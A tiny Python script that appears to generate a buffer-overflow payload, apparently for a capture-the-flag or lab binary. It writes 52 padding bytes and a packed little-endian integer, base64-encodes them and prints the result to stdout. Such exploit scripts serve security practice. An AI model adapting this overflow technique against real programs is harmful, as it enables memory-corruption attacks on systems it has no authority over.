
import sys
import struct
import base64

buf = b'gggggggggggggggggggggggggggggggggggggggggggggggggggg'
buf += struct.pack('<I', 1525796853)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
